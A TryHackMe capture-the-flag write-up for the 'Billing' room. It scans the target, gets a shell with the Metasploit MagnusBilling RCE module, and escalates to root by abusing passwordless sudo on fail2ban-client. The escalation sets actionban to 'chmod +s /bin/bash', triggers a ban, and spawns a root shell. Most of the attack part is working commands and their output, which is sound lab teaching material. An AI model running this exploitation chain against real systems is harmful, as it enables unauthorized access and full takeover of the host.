# Billing

Platform: TryHackMe
Difficulty: easy
OS: Linux
Category: Web
Tags: MagnusBilling, RCE, Metasploit, fail2ban, Privilege Escalation
Date: 2026-06-18

### Scanning

If you want more in-depth information when scanning. Use scripts based on each services running on each ports.

```bash
Nmap scan report for 10.10.109.113
Host is up, received user-set (0.26s latency).
Scanned at 2025-06-03 17:19:18 +08 for 18s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 95:e7:cc:a8:ae:7e:60:9b:cd:12:e1:dc:db:30:43:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNblE3IxqAAfS/dogDA0egvCgv2lIoT+Q4VwUNKa66xLJ7VfODxliaGkfprb+67uPwU4xwYh6YCoiy2Xr6DD5n8=
|   256 6a:6c:c3:9e:89:b5:fd:8d:4b:da:e0:57:20:5d:96:60 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlZ7oRz3es2kTlz2dSoydJdX28+y/A3UiHQAKvFlF6f
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.109.113/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql   syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visit the website of the target, you will see that it has an `/mbilling/` endpoint, it is a login page.

When searching on the internet, we will know that this *mbilling* is an Open-Source VoIP.

![image.png](image.png)

When you search in *searchsploit* you will see there’s a known exploit about this service, and it’s an RCE.

![image.png](image%201.png)

Meaning there’s an existing module in *metasplot*

### Exploitation & Foothold

Search for `magnusbilling` module in metasploit. Configure the RHOSTS, LHOST, and LPORT.

![image.png](image%202.png)

Run the exploit and you will get an RCE. If it fails, just do `set ForceExploit true`

You will gain a foothold as the user **Asterisk**. The user flag is at `/home/asterisk`

### Privilege Escalation

If you do `sudo -l` you will notice that asterisk can run `sudo` without being asked for password at 

```bash
asterisk@Billing:/$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Now obviously, we will need to leverage this `fail2ban-client` in order to escalate our privilege.

**WHAT IS FAIL2BAN?**

**fail2ban-client** is a command-line interface that allows us to interact with, configure, and control the **fail2ban-server**. To give a brief explanation, **fail2ban** is a security tool that monitors log files for suspicious activities (such as repeated failed login attempts) and bans the offending IP addresses by updating firewall rules.

First, we check if there’s a running process of this *fail2ban*

```bash
asterisk@Billing:/$ ps -aux | grep fail
root         539  0.2  1.4 1167416 27992 ?       Ssl  13:10   0:08 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

There’s an existing running process. Now, let’s check its status.

```bash
asterisk@Billing:/$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

To give you an idea, `jails` are basically configurations that define which logs to monitor, the patterns to look for, and the actions to take when a pattern is matched.

The configuration file of jail can be found at `/etc/fail2ban/jail.local` 

```bash
[asterisk-iptables]
enabled  = true
filter   = asterisk
action   = iptables-allports[name=ASTERISK, port=all, protocol=all]
logpath  = /var/log/asterisk/messages
maxretry = 5
bantime = 600
```

From the configuration, among other things, we see that the `asterisk-iptables` jail monitors the `/var/log/asterisk/messages` log file and checks for patterns defined in the `asterisk` filter (`/etc/fail2ban/filter.d/asterisk.conf`). When those patterns are matched, it performs the appropriate action defined in the `iptables-allports` action (`/etc/fail2ban/action.d/iptables-allports.conf`).

In order to properly use *fail2ban* and escalate our privilege, we will modify one of the actions defined for the jail, such as the action to perform (command to execute) when banning an IP.

First, we retrieve the currently set actions for one of the active jails.

```bash
asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
```

The **action definition** maps to the action file:

```bash
/etc/fail2ban/action.d/iptables-allports.conf

# It could also be iptables.conf
# Just look for the action below 
```

And if you open that file:

```bash
[Definition]
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

We will modify the command for the `actionban` in the `iptables-allports-ASTERISK` action, which is executed when banning an IP for the **asterisk-iptables** jail. We set it to run our command that sets the **setuid** bit on **/bin/bash** instead, as follows:

```bash
asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>

asterisk@Billing:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash

asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
chmod +s /bin/bash
```

Now, manually ban an IP address for the **asterisk-iptables** jail, which will execute the command for `actionban` **defined in the `iptables-allports-ASTERISK` action.

```bash
asterisk@Billing:/$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

asterisk@Billing:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
1

asterisk@Billing:/$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Now that `/bin/bash` has **setuid** bit set, we can use it to obtain a shell and read the root flag.

```bash
asterisk@Billing:/$ /bin/bash -p
bash-5.1# python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
root@Billing:/# id
uid=0(root) gid=0(root) groups=0(root),1001(asterisk)
root@Billing:/# wc -c /root/root.txt
38 /root/root.txt
```